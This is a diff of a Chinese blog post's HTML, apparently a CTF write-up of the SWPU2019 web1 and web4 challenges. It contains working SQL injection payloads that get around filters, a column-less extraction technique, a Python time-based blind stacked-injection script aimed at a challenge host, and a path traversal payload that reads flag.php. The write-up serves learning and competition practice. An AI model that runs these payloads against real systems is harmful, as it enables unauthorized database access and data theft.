@@ -470,39 +470,84 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>这道题目的点在于sql注入。开始的登陆框知识幌子，注册账号登陆进去后就会发现有一个广告申请的这一操作。通常看到这种形式，基本确定是sql注入或者是xss。FUZZ一下后，可以确认是sql。<br>尝试简单的注入语句，发现空格被过滤了，用<code>/**/</code>绕过成功。<br>当时还FUZZ出来了报错注入的关键函数，以及常见的注释符号，关键字or也被过滤了。<br>因此，按照自己的第一想法，可以尝试使用最普遍的union联合查询，只是这样会面临几个问题：</p>
 <p>1.注释被过滤带来的闭合问题<br>2.面对强过滤的or,后面进行注入爆出表名及列名的常规语句：<code>union select group_concat(table_name) from information_schema.tables where table_schema=database()</code>将存在information中的or被过滤的境地</p>
 <p>事实上，对于第一点的闭合问题，自己在网上找到了相关bypass技巧。确切说不算技巧，应该是在sql注入中对应当先做的第一步‘复原sql查询语句’后所进行的常规判断。<br>由于FUZZ，时，我们在输入<code>-1&#39;</code>时得到报错结果，那复原出来的语句应该是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from ads where title &#x3D; &#39;$title&#39; limit 0,1;</span><br></pre></td></tr></table></figure>
-<p>因此面对第一个问题，不使用过滤号，使用<code>&#39;</code>（单引号）闭合单引号是水到渠成的。<br>那么现在就要开始fuzz字段数了……首先，发现<code>order by</code>的or也被过滤了,转而使用<code>group by</code>。好的，这道题当时最为人诟病的地方来了，那就是它居然有22个字段数！我想人手工使用语句fuzz发现这么多字段数应该是早就怀疑人生了吧？当时估计很多人都倒在这题的字段数上。<br>FUZZ字段：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1</span><br></pre></td></tr></table></figure>
-<p>成功后接下来union select吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="字段"><br>确认了回显的是2和3对应字段。那么接下来如何解决<code>information_schema</code>的问题呢？这里我从官方wp中学到了bypass<code>information_schema</code>的方法参考这一篇文章<br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>仔细想想，information_schema在注入中不可或缺的原因无非是因为它包含了所有其他数据库的信息，主要是table_schema，table_name.column_name等等。那么有没有具有类似功能的存在呢？文章中提供了一种解法:<code>sys.schema_auto_increment_columns</code>该视图的作用就是用来对表自增ID的监控。如果表中存在自增id,那么这个视图就会包含这一 表。所以我们的解法是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_colum ns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
-<p>然后难过了，回显居然是这个表不存在？！也不知道是不是这道题在buuoj上少了啥，毕竟我用的跟官方wp是一样的……那就没办法了，只能盲猜一些常见表名，比如user，password之类的。这里就开个天眼表示是users表吧。<br>接下来由于不知道列名，引入一个以前自己不怎么熟悉的点：无列名注入，这里看到一篇文章讲的很准确：<br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a><br>这里直接引用它的数据了：<br>普通的sql注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| id | name         | password                                 | email                       | birthdate  | added               |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">|  1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">|  2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">|  3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">|  4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">|  5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 ,6union select * from users</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">| 1 | 2            | 3                                        | 4                           | 5          | 6                   |</span><br><span class="line">| 1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |</span><br><span class="line">| 2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |</span><br><span class="line">| 3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |</span><br><span class="line">| 4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |</span><br><span class="line">| 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |</span><br><span class="line">+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>这时若要引用，使用反引号：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;4&#96; from (select 1,2,3,4,5,6 union select * from users)a;</span><br></pre></td></tr></table></figure>
-<p>则会单独拿到第四列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>如果反引号被过滤了，也有其他方法。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| b                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 4                           |</span><br><span class="line">| veronica80@example.org      |</span><br><span class="line">| sawayn.amelie@example.com   |</span><br><span class="line">| stefan41@example.com        |</span><br><span class="line">| zwalsh@example.com          |</span><br><span class="line">| pattie.medhurst@example.net |</span><br><span class="line">+-----------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>回到题目，不难得出最终payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1, (select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure>
+<pre><code>select * from ads where title = &#39;$title&#39; limit 0,1;</code></pre><p>因此面对第一个问题，不使用过滤号，使用<code>&#39;</code>（单引号）闭合单引号是水到渠成的。<br>那么现在就要开始fuzz字段数了……首先，发现<code>order by</code>的or也被过滤了,转而使用<code>group by</code>。好的，这道题当时最为人诟病的地方来了，那就是它居然有22个字段数！我想人手工使用语句fuzz发现这么多字段数应该是早就怀疑人生了吧？当时估计很多人都倒在这题的字段数上。<br>FUZZ字段：</p>
+<pre><code>-1&#39;/**/group/**/by/**/22,&#39;1</code></pre><p>成功后接下来union select吧</p>
+<pre><code>-1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="字段"><br>确认了回显的是2和3对应字段。那么接下来如何解决<code>information_schema</code>的问题呢？这里我从官方wp中学到了bypass<code>information_schema</code>的方法参考这一篇文章<br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a><br>仔细想想，information_schema在注入中不可或缺的原因无非是因为它包含了所有其他数据库的信息，主要是table_schema，table_name.column_name等等。那么有没有具有类似功能的存在呢？文章中提供了一种解法:<code>sys.schema_auto_increment_columns</code>该视图的作用就是用来对表自增ID的监控。如果表中存在自增id,那么这个视图就会包含这一 表。所以我们的解法是</p>
+<pre><code>-1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p>然后难过了，回显居然是这个表不存在？！也不知道是不是这道题在buuoj上少了啥，毕竟我用的跟官方wp是一样的……那就没办法了，只能盲猜一些常见表名，比如user，password之类的。这里就开个天眼表示是users表吧。<br>接下来由于不知道列名，引入一个以前自己不怎么熟悉的点：无列名注入，这里看到一篇文章讲的很准确：<br><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</a><br>这里直接引用它的数据了：<br>普通的sql注入</p>
+<pre><code>select * from users</code></pre><pre><code>+----+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+| id | name         | password                                 | email                       | birthdate  | added               |
++----+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+|  1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |
+|  2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |
+|  3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |
+|  4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |
+|  5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |
++----+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+5 rows in set (0.00 sec)</code></pre><pre><code>select 1,2,3,4,5 ,6union select * from users</code></pre><pre><code>+---+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+| 1 | 2            | 3                                        | 4                           | 5          | 6                   |
++---+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+| 1 | 2            | 3                                        | 4                           | 5          | 6                   |
+| 1 | alias        | a45d4e080fc185dfa223aea3d0c371b6cc180a37 | veronica80@example.org      | 1981-05-03 | 1993-03-20 14:03:14 |
+| 2 | accusamus    | 114fec39a7c9567e8250409d467fed64389a7bee | sawayn.amelie@example.com   | 1979-10-28 | 2007-01-20 18:38:29 |
+| 3 | dolor        | 7f796c9e61c32a5ec3c85fed794c00eee2381d73 | stefan41@example.com        | 2005-11-16 | 1992-02-16 04:19:05 |
+| 4 | et           | aaaf2b311a1cd97485be716a896f9c09aff55b96 | zwalsh@example.com          | 2015-07-22 | 2014-03-05 22:57:18 |
+| 5 | voluptatibus | da16b4d9661c56bb448899d7b6d30060da014446 | pattie.medhurst@example.net | 1991-11-22 | 2005-12-04 20:38:41 |
++---+--------------+------------------------------------------+-----------------------------+------------+---------------------+
+6 rows in set (0.00 sec)</code></pre><p>这时若要引用，使用反引号：</p>
+<pre><code> select `4` from (select 1,2,3,4,5,6 union select * from users)a;</code></pre><p>则会单独拿到第四列</p>
+<pre><code>+-----------------------------+
+| 4                           |
++-----------------------------+
+| 4                           |
+| veronica80@example.org      |
+| sawayn.amelie@example.com   |
+| stefan41@example.com        |
+| zwalsh@example.com          |
+| pattie.medhurst@example.net |
++-----------------------------+
+6 rows in set (0.00 sec)</code></pre><p>如果反引号被过滤了，也有其他方法。</p>
+<pre><code>select b from (select 1,2,3 as b,4,5 union select * from users)a;</code></pre><pre><code>+-----------------------------+
+| b                           |
++-----------------------------+
+| 4                           |
+| veronica80@example.org      |
+| sawayn.amelie@example.com   |
+| stefan41@example.com        |
+| zwalsh@example.com          |
+| pattie.medhurst@example.net |
++-----------------------------+
+6 rows in set (0.00 sec)</code></pre><p>回到题目，不难得出最终payload:</p>
+<pre><code>-1&#39;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </code></pre><pre><code>-1&#39;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </code></pre><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>昨天晚上写了写web1,折腾的够呛。今天在复现web4时也挺难受的，所幸最后还是做出来了。<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="登录框"><br>题目所给def注册功能并没有开放，而登录键点了也没有反应。抓包的话会有新发现：<img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="注入"><br>如果只有单引号的话，会报错。但是如果输入结果除了单引号还有分号的话，返回的仍是202。这代表了什么呢？首先可以确认是注入，同时还可以大致判断是堆叠注入。<br>关于堆叠注入我并没有什么了解。于是去搜索了下，发现这几年开始有堆叠注入的ctf题在各大赛事中出现。其特点无非是：限制了常用的select,update等等关键语句。但是却没有限制你的分号使用，也就是说，我们可以一次执行多条sql语句。而如果适当搭配，一样可以起到注入的效果。<br>根据官方的说法，这是属于PDO场景下的sql注入，出题人给的方法就是用16进制加mysql预处理来解决。其payload大致格式如下：</p>
+<pre><code>set @a=0x{0};PREPARE ctftest from @a;execute ctftest;</code></pre><p>前面的@a即为我们所需的注入语句的16进制变量，后面<code>PREPARE ctftest from @a;execute ctftest;</code>两句起到了定义并执行预处理语句的作用<br>那么盲注脚本如下：</p>
+<pre><code class="python">import requests
 
+url=&quot;http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login&quot;
 
+flag=&quot;&quot;
+def str_to_hex(s):
+    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])
 
-<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>昨天晚上写了写web1,折腾的够呛。今天在复现web4时也挺难受的，所幸最后还是做出来了。<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="登录框"><br>题目所给def注册功能并没有开放，而登录键点了也没有反应。抓包的话会有新发现：<img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="注入"><br>如果只有单引号的话，会报错。但是如果输入结果除了单引号还有分号的话，返回的仍是202。这代表了什么呢？首先可以确认是注入，同时还可以大致判断是堆叠注入。<br>关于堆叠注入我并没有什么了解。于是去搜索了下，发现这几年开始有堆叠注入的ctf题在各大赛事中出现。其特点无非是：限制了常用的select,update等等关键语句。但是却没有限制你的分号使用，也就是说，我们可以一次执行多条sql语句。而如果适当搭配，一样可以起到注入的效果。<br>根据官方的说法，这是属于PDO场景下的sql注入，出题人给的方法就是用16进制加mysql预处理来解决。其payload大致格式如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set @a&#x3D;0x&#123;0&#125;;PREPARE ctftest from @a;execute ctftest;</span><br></pre></td></tr></table></figure>
-<p>前面的@a即为我们所需的注入语句的16进制变量，后面<code>PREPARE ctftest from @a;execute ctftest;</code>两句起到了定义并执行预处理语句的作用<br>那么盲注脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://094a7801-436a-4a50-9b73-ea921af6361c.node3.buuoj.cn/index.php?r=Login/Login"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``."</span>:</span><br><span class="line">        sql = <span class="string">"select if((ascii(substr((select group_concat(flag) from flag),"</span>+str(i)+<span class="string">",1))='"</span>+str(ord(str1))+<span class="string">"'),sleep(6),2);"</span>   <span class="comment"># ctf</span></span><br><span class="line">        sql_hex = str_to_hex(sql)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"1\';SET @a=0x"</span>+str(sql_hex)+<span class="string">";PREPARE st FROM @a;EXECUTE st;"</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"123"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result=requests.post(url,json=data,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#glzjinwantsaliendzip</span></span><br><span class="line"><span class="comment">#glzjinnts_a_girl_friendzip</span></span><br><span class="line"><span class="comment">#glzjinwantsgirliendzip</span></span><br><span class="line"><span class="comment">#glzjin_wants_a_girl_friend.zip</span></span><br></pre></td></tr></table></figure>
-
+for i in range(1,40):
+    print(i)
+    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;:
+        sql = &quot;select if((ascii(substr((select group_concat(flag) from flag),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(ord(str1))+&quot;&#39;),sleep(6),2);&quot;   # ctf
+        sql_hex = str_to_hex(sql)
+        data={
+            &quot;username&quot;:&quot;1\&#39;;SET @a=0x&quot;+str(sql_hex)+&quot;;PREPARE st FROM @a;EXECUTE st;&quot;,
+            &quot;password&quot;:&quot;123&quot;
+        }
+        try:
+            result=requests.post(url,json=data,timeout=6)
+        except requests.exceptions.ReadTimeout:
+            print(flag)
+            break
+print(flag)
+#glzjinwantsaliendzip
+#glzjinnts_a_girl_friendzip
+#glzjinwantsgirliendzip
+#glzjin_wants_a_girl_friend.zip</code></pre>
 <p>这里可能由于buuoj的问题吧，访问过快直接429,导致每次跑出的结果都不一样。最后汇总下才推断出来是glzjin_wants_a_girl_friend.zip。(这里直接select flag from flag了，实在不想又去爆表爆列了。。）<br>拿到源码，审计不提了。直接说出题人思路吧：<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/5.jpg" class="lazyload" data-srcset="5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="审计"><br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="利用"><br>发现会读取img_file内容并以base64输出。那么只要img_file包含flag.php就好了。<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;User&#x2F;Index&amp;img_file&#x3D;&#x2F;..&#x2F;flag.php</span><br></pre></td></tr></table></figure>
-<p>即可从源码处解码拿到flag<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
+<pre><code>?r=User/Index&amp;img_file=/../flag.php</code></pre><p>即可从源码处解码拿到flag<br><img src="/2020/01/19/%E4%BB%8ESWPU2019-WEB1-WEB4%E5%AD%A6sql%E6%B3%A8%E5%85%A5/7.jpg" class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 
   
   
